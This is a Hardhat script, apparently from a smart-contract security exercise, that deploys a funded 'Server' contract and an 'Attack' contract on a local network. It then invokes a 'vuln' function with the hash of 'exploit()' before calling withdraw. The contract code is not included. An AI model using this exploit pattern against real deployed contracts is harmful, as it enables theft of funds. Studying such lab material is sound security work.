const { ethers } = require("hardhat");// TODO: 语法
// const web3 = require('web3');

async function getBalanceAt(addr) {
    const balance = await ethers.provider.getBalance(addr);
    return ethers.formatEther(balance);
}

async function main() {
    // 返回任意长度的合约账号地址
    const [victim, attacker] = await ethers.getSigners();

    // await network.provider.send("hardhat_setBalance", [
    //     await attacker.getAddress(),
    //     "0x10000000000000000",
    // ]);// clear attacker's balance but only remain gas fee

    console.log(`Victim account's address is ${await victim.getAddress()}`);
    console.log(`Attacker account's address is ${await attacker.getAddress()}`);

    const init_amount = ethers.parseEther("10");

    const server = await ethers.deployContract("Server", {
        signer: victim,
        value: init_amount,
    });
    await server.waitForDeployment();

    console.log(`Server contract deployed at ${await server.getAddress()}`)

    console.log(`Server contract's balance is ${await getBalanceAt(await server.getAddress())} Wei`);

    // const receiver = await ethers.deployContract("Receiver", [], {
    //     signer: attacker,
    // });
    // await receiver.waitForDeployment();

    const attack = await ethers.deployContract(
        "Attack", 
        [], 
        { signer: attacker, }
    );
    await attack.waitForDeployment();

    console.log(`Attack contract deployed at ${await attack.getAddress()}`)

    const hash = (str) => {return ethers.keccak256(ethers.toUtf8Bytes(str))};
    // const payload = "exploit(" + hash(receiver.getAddress()) + ")";
    await server.vuln(
        await attack.getAddress(),
        hash("exploit()")
    )

    await server.withdraw();

}


main().then(() => process.exit(0))
      .catch((e) => {
        console.error(e);
        process.exit(1)
    })